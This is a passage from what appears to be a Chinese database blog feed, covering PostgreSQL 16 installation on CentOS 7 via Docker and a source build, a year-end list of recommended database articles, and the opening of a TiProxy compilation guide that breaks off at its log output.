<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker run --name pg16 -e POSTGRES_HOST_AUTH_METHOD=trust -d postgres:16</span><br><span class="line">e3bb74e44107d349f8a2c4a0f9ac9cb3aa4ac26e66bb930069b37c563cc815dd</span><br><span class="line">[shawnyan@centos7 ~]$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS        PORTS                                       NAMES</span><br><span class="line">e3bb74e44107   postgres:16          &quot;docker-entrypoint.s…&quot;   2 seconds ago   Up 1 second   5432/tcp                                    pg16</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是，需要指定超管用户的密码，或者允许所有连接没有密码登陆，否则容器会启动失败。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker logs pg16</span><br><span class="line">Error: Database is uninitialized and superuser password is not specified.</span><br><span class="line">       You must specify POSTGRES_PASSWORD to a non-empty value for the</span><br><span class="line">       superuser. For example, &quot;-e POSTGRES_PASSWORD=password&quot; on &quot;docker run&quot;.</span><br><span class="line"></span><br><span class="line">       You may also use &quot;POSTGRES_HOST_AUTH_METHOD=trust&quot; to allow all</span><br><span class="line">       connections without a password. This is *not* recommended.</span><br><span class="line"></span><br><span class="line">       See PostgreSQL documentation about &quot;trust&quot;:</span><br><span class="line">       https://www.postgresql.org/docs/current/auth-trust.html</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>连接 PG16。</li>
</ol>
<p>通过 psql 连接 PG16，并查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker exec -it pg16 psql -U postgres</span><br><span class="line">psql (16.0 (Debian 16.0-1.pgdg120+1))</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# select version();</span><br><span class="line">                                                       version</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 16.0 (Debian 16.0-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">postgres=# select &#x27;Hi, PG16~&#x27;;</span><br><span class="line"> ?column?</span><br><span class="line">-----------</span><br><span class="line"> Hi, PG16~</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<h2 id="在-CentOS-7-上编译-PG16-源码（进阶）">在 CentOS 7 上编译 PG16 源码（进阶）</h2>
<p>PG16 在 CentOS 7 上的源码编译步骤与 PG15 类似，具体可参考文章 <a href="https://shawnyan.cn/2023/postgresql/pg-15-compile-with-dockerfile/">《【PG15】【番外篇】自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像》</a> 。</p>
<ol>
<li>下载 PG16 的源码，并进行编译、安装。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.neusoft.edu.cn/postgresql/source/v16.0/postgresql-16.0.tar.gz</span><br><span class="line">tar zxf postgresql-16.0.tar.gz</span><br><span class="line">cd postgresql-16.0/</span><br><span class="line">./configure --prefix=/opt/postgresql --with-extra-version=&quot;-ShawnYan&quot;</span><br><span class="line">make -j $(nproc) world</span><br><span class="line">make install-world</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>初始化 PG16。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">initdb --pgdata=<span class="string">&quot;<span class="variable">$PGDATA</span>&quot;</span></span></span><br><span class="line">The files belonging to this database system will be owned by user &quot;postgres&quot;.</span><br><span class="line">This user must also own the server process.</span><br><span class="line"></span><br><span class="line">The database cluster will be initialized with locale &quot;en_US.UTF-8&quot;.</span><br><span class="line">The default database encoding has accordingly been set to &quot;UTF8&quot;.</span><br><span class="line">The default text search configuration will be set to &quot;english&quot;.</span><br><span class="line"></span><br><span class="line">Data page checksums are disabled.</span><br><span class="line"></span><br><span class="line">fixing permissions on existing directory /data/pg16/data ... ok</span><br><span class="line">creating subdirectories ... ok</span><br><span class="line">selecting dynamic shared memory implementation ... posix</span><br><span class="line">selecting default max_connections ... 100</span><br><span class="line">selecting default shared_buffers ... 128MB</span><br><span class="line">selecting default time zone ... Asia/Tokyo</span><br><span class="line">creating configuration files ... ok</span><br><span class="line">running bootstrap script ... ok</span><br><span class="line">performing post-bootstrap initialization ... ok</span><br><span class="line">syncing data to disk ... ok</span><br><span class="line"></span><br><span class="line">initdb: warning: enabling &quot;trust&quot; authentication for local connections</span><br><span class="line">initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.</span><br><span class="line"></span><br><span class="line">Success. You can now start the database server using:</span><br><span class="line"></span><br><span class="line">    pg_ctl -D /data/pg16/data -l logfile start</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>启动 PG16。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pg_ctl -D /data/pg16/data -l logfile start</span></span><br><span class="line">waiting for server to start.... done</span><br><span class="line">server started</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>查看版本信息。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql</span></span><br><span class="line">psql (16.0-ShawnYan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">postgres=# select version();</span><br><span class="line">                                                     version</span><br><span class="line">------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 16.0-ShawnYan on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44), 64-bit</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<img  alt="pg16.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231002-2a4cc720-ddb6-4955-9ef1-a0e7b4061dfc.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，PG16 已在 CentOS 7 上安装完成。</p>
<h2 id="总结">总结</h2>
<p>CentOS 7 的时代即将结束，将来如何选择操作系统，是选用 Redhat、Rocky Linux、Ubuntu，还是云厂商的 Linux ？</p>
<p>或许，在考虑升级 PG 版本的同时，也是时候该考虑一下 OS 的版本了。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1708651177100013568" >https://www.modb.pro/db/1708651177100013568 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2526" >https://pgfans.cn/a/2526 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/about/news/postgresql-16-released-2715/" >https://www.postgresql.org/about/news/postgresql-16-released-2715/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/16/release-16.html" >https://www.postgresql.org/docs/16/release-16.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/16/parallel-query.html" >https://www.postgresql.org/docs/16/parallel-query.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/16/predefined-roles.html" >https://www.postgresql.org/docs/16/predefined-roles.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/16/functions-json.html" >https://www.postgresql.org/docs/16/functions-json.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn6" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/docs/16/monitoring-stats.html#MONITORING-PG-STAT-IO-VIEW" >https://www.postgresql.org/docs/16/monitoring-stats.html#MONITORING-PG-STAT-IO-VIEW <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn7" class="footnote-item"><p><a class="link"   href="https://download.postgresql.org/pub/repos/yum/16/redhat/" >https://download.postgresql.org/pub/repos/yum/16/redhat/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn8" class="footnote-item"><p><a class="link"   href="https://yum.postgresql.org/news/rhel7-postgresql-rpms-end-of-life/" >https://yum.postgresql.org/news/rhel7-postgresql-rpms-end-of-life/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn9" class="footnote-item"><p><a class="link"   href="https://github.com/docker-library/postgres" >https://github.com/docker-library/postgres <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 16</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>postgresql</tag>
        <tag>compile</tag>
        <tag>postgresql 16</tag>
        <tag>centos 7</tag>
      </tags>
  </entry>
  <entry>
    <title>【年终盘点】【合集】严选首推文章清单</title>
    <url>/2023/modb/modb-articles-recommended/</url>
    <content><![CDATA[<p>严选 55 篇曾发布于墨天轮上的文章，文章列表如下。</p>
<p>其中，2023 年 38 篇首页推荐文章，2022 年 16 篇首页推荐文章，2021 年 1 篇首页推荐文章。</p>
<ul>
<li>2023 年</li>
</ul>
<table>
<thead>
<tr>
<th>ID</th>
<th>Date</th>
<th>Link</th>
<th>Title</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>2023-12-28</td>
<td><a class="link"   href="https://www.modb.pro/db/1740188750046109696" >https://www.modb.pro/db/1740188750046109696 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【2023年终盘点】那些今年考下的国产数据库认证</td>
</tr>
<tr>
<td>2</td>
<td>2023-12-11</td>
<td><a class="link"   href="https://www.modb.pro/db/1734117877862178816" >https://www.modb.pro/db/1734117877862178816 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>AntDB v7.2.0 社区版适配 Rocky 9 及体验笔记</td>
</tr>
<tr>
<td>3</td>
<td>2023-12-07</td>
<td><a class="link"   href="https://www.modb.pro/db/1732630363053826048" >https://www.modb.pro/db/1732630363053826048 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB v7.5.0 LTS 升级必读 – 新特性补充说明</td>
</tr>
<tr>
<td>4</td>
<td>2023-12-06</td>
<td><a class="link"   href="https://www.modb.pro/db/1732209819015782400" >https://www.modb.pro/db/1732209819015782400 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>StoneDB 企业版 8.0-v2.2.0 初体验</td>
</tr>
<tr>
<td>5</td>
<td>2023-12-03</td>
<td><a class="link"   href="https://www.modb.pro/db/1731331556252409856" >https://www.modb.pro/db/1731331556252409856 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>「YashanDB个人版体验」YashanDB 23 与 BenchmarkSQL 6 兼容性适配</td>
</tr>
<tr>
<td>6</td>
<td>2023-11-28</td>
<td><a class="link"   href="https://www.modb.pro/db/1729138634627555328" >https://www.modb.pro/db/1729138634627555328 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>「YashanDB个人版体验」基于 HAProxy 配置 YashanDB 的读写分离</td>
</tr>
<tr>
<td>7</td>
<td>2023-11-24</td>
<td><a class="link"   href="https://www.modb.pro/db/1727742975546564608" >https://www.modb.pro/db/1727742975546564608 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用</td>
</tr>
<tr>
<td>8</td>
<td>2023-11-22</td>
<td><a class="link"   href="https://www.modb.pro/db/1727158807037026304" >https://www.modb.pro/db/1727158807037026304 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【PG15】 在 Rocky 9 上安装 PostgreSQL 15 的五种方法（总有一个你没用过🤪）</td>
</tr>
<tr>
<td>9</td>
<td>2023-11-21</td>
<td><a class="link"   href="https://www.modb.pro/db/1726792483760840704" >https://www.modb.pro/db/1726792483760840704 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>再遇“含笑半步颠”，升级 MariaDB 10.6.16 的三个理由</td>
</tr>
<tr>
<td>10</td>
<td>2023-11-12</td>
<td><a class="link"   href="https://www.modb.pro/db/1723383648416784384" >https://www.modb.pro/db/1723383648416784384 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>三天三夜的三更半夜! StoneDB on Rocky 9</td>
</tr>
<tr>
<td>11</td>
<td>2023-11-10</td>
<td><a class="link"   href="https://www.modb.pro/db/1722794246820945920" >https://www.modb.pro/db/1722794246820945920 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【MySQL 8.2.0】定制化 MySQL 8.2.0 编译选项（文末彩蛋）</td>
</tr>
<tr>
<td>12</td>
<td>2023-10-31</td>
<td><a class="link"   href="https://www.modb.pro/db/1719316230573203456" >https://www.modb.pro/db/1719316230573203456 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>IvorySQL v3.0 新特性浅测</td>
</tr>
<tr>
<td>13</td>
<td>2023-10-31</td>
<td><a class="link"   href="https://www.modb.pro/db/1719038517697929216" >https://www.modb.pro/db/1719038517697929216 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【YashanDB个人版体验】YashanDB 个人版安装初体验</td>
</tr>
<tr>
<td>14</td>
<td>2023-10-31</td>
<td><a class="link"   href="https://www.modb.pro/db/1719026980815986688" >https://www.modb.pro/db/1719026980815986688 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【MySQL 8.2.0】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南</td>
</tr>
<tr>
<td>15</td>
<td>2023-10-27</td>
<td><a class="link"   href="https://www.modb.pro/db/1717737071887081472" >https://www.modb.pro/db/1717737071887081472 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明</td>
</tr>
<tr>
<td>16</td>
<td>2023-10-25</td>
<td><a class="link"   href="https://www.modb.pro/db/1717086120041865216" >https://www.modb.pro/db/1717086120041865216 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2</td>
</tr>
<tr>
<td>17</td>
<td>2023-10-24</td>
<td><a class="link"   href="https://www.modb.pro/db/1716634949384757248" >https://www.modb.pro/db/1716634949384757248 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统</td>
</tr>
<tr>
<td>18</td>
<td>2023-10-18</td>
<td><a class="link"   href="https://www.modb.pro/db/1714460416624123904" >https://www.modb.pro/db/1714460416624123904 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 7.x 源码编译之 TiDB Server 篇，及新特性详解（文末彩蛋）</td>
</tr>
<tr>
<td>19</td>
<td>2023-10-02</td>
<td><a class="link"   href="https://www.modb.pro/db/1708651177100013568" >https://www.modb.pro/db/1708651177100013568 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【PG16】 后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行</td>
</tr>
<tr>
<td>20</td>
<td>2023-08-15</td>
<td><a class="link"   href="https://www.modb.pro/db/1691462689881149440" >https://www.modb.pro/db/1691462689881149440 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>我和 TiDB 的故事 – 远近高低各不同</td>
</tr>
<tr>
<td>21</td>
<td>2023-08-15</td>
<td><a class="link"   href="https://www.modb.pro/db/1691357843140202496" >https://www.modb.pro/db/1691357843140202496 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 源码编译之 TiFlash 篇</td>
</tr>
<tr>
<td>22</td>
<td>2023-08-07</td>
<td><a class="link"   href="https://www.modb.pro/db/1688444477693304832" >https://www.modb.pro/db/1688444477693304832 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 源码编译之 TiUP 篇</td>
</tr>
<tr>
<td>23</td>
<td>2023-07-31</td>
<td><a class="link"   href="https://www.modb.pro/db/1685939203413204992" >https://www.modb.pro/db/1685939203413204992 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 源码编译之 PD/TiDB Dashboard 篇</td>
</tr>
<tr>
<td>24</td>
<td>2023-07-25</td>
<td><a class="link"   href="https://www.modb.pro/db/1683749932984508416" >https://www.modb.pro/db/1683749932984508416 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>再遇 MySQL “一招必杀” Bug</td>
</tr>
<tr>
<td>25</td>
<td>2023-07-24</td>
<td><a class="link"   href="https://www.modb.pro/db/1683487036479725568" >https://www.modb.pro/db/1683487036479725568 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>浅析 TiSpark v3.x 新变化</td>
</tr>
<tr>
<td>26</td>
<td>2023-07-21</td>
<td><a class="link"   href="https://www.modb.pro/db/1682292038413918208" >https://www.modb.pro/db/1682292038413918208 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>严选书单 – 国产数据库的技术书籍（最新版）</td>
</tr>
<tr>
<td>27</td>
<td>2023-07-12</td>
<td><a class="link"   href="https://www.modb.pro/db/658163" >https://www.modb.pro/db/658163 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>openGauss 5.0.0 资源管控功能介绍</td>
</tr>
<tr>
<td>28</td>
<td>2023-07-07</td>
<td><a class="link"   href="https://www.modb.pro/db/656609" >https://www.modb.pro/db/656609 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>浅尝 openGauss v5.0.0 的 MySQL 语法兼容性</td>
</tr>
<tr>
<td>29</td>
<td>2023-07-05</td>
<td><a class="link"   href="https://www.modb.pro/db/655984" >https://www.modb.pro/db/655984 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>StoneDB 初体验 – StoneDB-5.7-v1.0.4 安装及新特性速览</td>
</tr>
<tr>
<td>30</td>
<td>2023-07-05</td>
<td><a class="link"   href="https://www.modb.pro/db/655884" >https://www.modb.pro/db/655884 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 7.1.0 LTS 特性解读 – 资源管控 (Resource Control) 应该知道的 6 件事</td>
</tr>
<tr>
<td>31</td>
<td>2023-06-13</td>
<td><a class="link"   href="https://www.modb.pro/db/646733" >https://www.modb.pro/db/646733 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ProxySQL 2.4.7 安装及新特性速览</td>
</tr>
<tr>
<td>32</td>
<td>2023-06-12</td>
<td><a class="link"   href="https://www.modb.pro/db/645884" >https://www.modb.pro/db/645884 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>GBCA (Galaxybase) 认证学习资料内参</td>
</tr>
<tr>
<td>33</td>
<td>2023-06-08</td>
<td><a class="link"   href="https://www.modb.pro/db/641554" >https://www.modb.pro/db/641554 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>了解 MariaDB 从启动日志入手</td>
</tr>
<tr>
<td>34</td>
<td>2023-04-09</td>
<td><a class="link"   href="https://www.modb.pro/db/622578" >https://www.modb.pro/db/622578 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>再遇 GBase 如沐春风</td>
</tr>
<tr>
<td>35</td>
<td>2023-03-19</td>
<td><a class="link"   href="https://www.modb.pro/db/619355" >https://www.modb.pro/db/619355 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【PG15】 自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像</td>
</tr>
<tr>
<td>36</td>
<td>2023-03-14</td>
<td><a class="link"   href="https://www.modb.pro/db/618721" >https://www.modb.pro/db/618721 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>快速搭建 GBase 8c 集群环境</td>
</tr>
<tr>
<td>37</td>
<td>2023-03-08</td>
<td><a class="link"   href="https://www.modb.pro/db/617900" >https://www.modb.pro/db/617900 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【PG15】 PostgreSQL 15 新日志格式 jsonlog</td>
</tr>
<tr>
<td>38</td>
<td>2023-02-23</td>
<td><a class="link"   href="https://www.modb.pro/db/615439" >https://www.modb.pro/db/615439 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB x Aliyun 免费试用，竟还有这般福利？</td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li>2021~2022 年</li>
</ul>
<table>
<thead>
<tr>
<th>ID</th>
<th>Date</th>
<th>Link</th>
<th>Title</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>2022/06/21</td>
<td><a class="link"   href="https://www.modb.pro/db/421791" >https://www.modb.pro/db/421791 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 6.1 新特性解读 – TiDB 6.1 MPP 实现窗口函数框架</td>
</tr>
<tr>
<td>2</td>
<td>2022/06/14</td>
<td><a class="link"   href="https://www.modb.pro/db/414883" >https://www.modb.pro/db/414883 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiSpark v2.5 开发入门实践及 TiSpark v3.0.0 新功能解读</td>
</tr>
<tr>
<td>3</td>
<td>2022/05/14</td>
<td><a class="link"   href="https://www.modb.pro/db/403262" >https://www.modb.pro/db/403262 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 和 Python 的 CRUD 应用开发实践</td>
</tr>
<tr>
<td>4</td>
<td>2022/05/11</td>
<td><a class="link"   href="https://www.modb.pro/db/401830" >https://www.modb.pro/db/401830 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 6.0 新特性解读 – 离线包变更</td>
</tr>
<tr>
<td>5</td>
<td>2022/05/11</td>
<td><a class="link"   href="https://www.modb.pro/db/400877" >https://www.modb.pro/db/400877 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>2022年5月中国数据库排行榜：openGauss 黑马首登顶，AntDB 冲进20强</td>
</tr>
<tr>
<td>6</td>
<td>2022/05/07</td>
<td><a class="link"   href="https://www.modb.pro/db/400382" >https://www.modb.pro/db/400382 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 6.0 新特性解读之 TiFlash 新增算子和函数下推</td>
</tr>
<tr>
<td>7</td>
<td>2022/05/05</td>
<td><a class="link"   href="https://www.modb.pro/db/399619" >https://www.modb.pro/db/399619 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>TiDB 6.0 新特性解读之 Collation 规则</td>
</tr>
<tr>
<td>8</td>
<td>2022/04/29</td>
<td><a class="link"   href="https://www.modb.pro/db/399340" >https://www.modb.pro/db/399340 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>OceanBase 表组（Tablegroup）测试及 OceanBase 自带工具使用示例</td>
</tr>
<tr>
<td>9</td>
<td>2022/04/21</td>
<td><a class="link"   href="https://www.modb.pro/db/397405" >https://www.modb.pro/db/397405 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>使用 DBT-3 对 OceanBase 和 MariaDB 进行性能测试对比</td>
</tr>
<tr>
<td>10</td>
<td>2022/04/20</td>
<td><a class="link"   href="https://www.modb.pro/db/397122" >https://www.modb.pro/db/397122 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>大才能否小用？OceanBase一体化场景测试</td>
</tr>
<tr>
<td>11</td>
<td>2022/03/10</td>
<td><a class="link"   href="https://www.modb.pro/db/374368" >https://www.modb.pro/db/374368 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>[译] 记一次 MySQL Galera 集群的小版本升级</td>
</tr>
<tr>
<td>12</td>
<td>2022/03/05</td>
<td><a class="link"   href="https://www.modb.pro/db/337531" >https://www.modb.pro/db/337531 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>OB练习 – 查看 OceanBase 执行计划</td>
</tr>
<tr>
<td>13</td>
<td>2022/03/01</td>
<td><a class="link"   href="https://www.modb.pro/db/336396" >https://www.modb.pro/db/336396 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>【OBCP蓝宝书】 基于 CentOS 7.9 编译 OceanBase 社区版 v3.1.2 的 observer 源码</td>
</tr>
<tr>
<td>14</td>
<td>2022/02/24</td>
<td><a class="link"   href="https://www.modb.pro/db/335245" >https://www.modb.pro/db/335245 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>温故知新 – mydumper &amp; dumpling 知识点汇总</td>
</tr>
<tr>
<td>15</td>
<td>2022/02/15</td>
<td><a class="link"   href="https://www.modb.pro/db/324743" >https://www.modb.pro/db/324743 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>PCTA 认证需要掌握的知识点 – 考前必读</td>
</tr>
<tr>
<td>16</td>
<td>2022/01/12</td>
<td><a class="link"   href="https://www.modb.pro/db/237415" >https://www.modb.pro/db/237415 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>🏮集【福】咯</td>
</tr>
<tr>
<td>17</td>
<td>2021/12/13</td>
<td><a class="link"   href="https://www.modb.pro/db/197751" >https://www.modb.pro/db/197751 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>OceanBase OBCP 考试经验小结</td>
</tr>
</tbody>
</table>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1701843751673090048" >https://www.modb.pro/db/1701843751673090048 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>opengauss</tag>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>postgresql</tag>
        <tag>tidb</tag>
        <tag>linux</tag>
        <tag>modb</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.x 源码编译之 TiProxy 篇，及尝鲜体验</title>
    <url>/2023/tidb/tidb-7.x-compile-tiproxy/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiProxy-简介">TiProxy 简介</h2>
<p>TiProxy 是一个基于 Apache 2.0 协议开源的、轻量级的 TiDB 数据库代理，基于 Go 语言编写，支持 MySQL 协议。<br>
TiProxy 支持负载均衡，接收来自应用程序的请求，然后将其发送到 TiDB 集群。支持自动故障转移，当后端 TiDB Server 发生故障，可以自动将连接转移到其他节点，以提高应用程序的可用性。</p>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/02-1692809623528.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiProxy-编译">TiProxy 编译</h2>
<p>TiProxy 是轻量级组件，编译步骤很简洁，编译环境同前 <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiup/">《TiDB 源码编译之 TiUP 篇》</a> 。</p>
<p>编译步骤如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/shawn0915/tiproxy --depth=1</span><br><span class="line"><span class="built_in">cd</span> tiproxy</span><br><span class="line">go mod download -x</span><br><span class="line">go mod tidy -v</span><br><span class="line"><span class="built_in">export</span> VERSION=<span class="string">&#x27;v0.1.1-ShawnYan&#x27;</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>日志输出：</p>
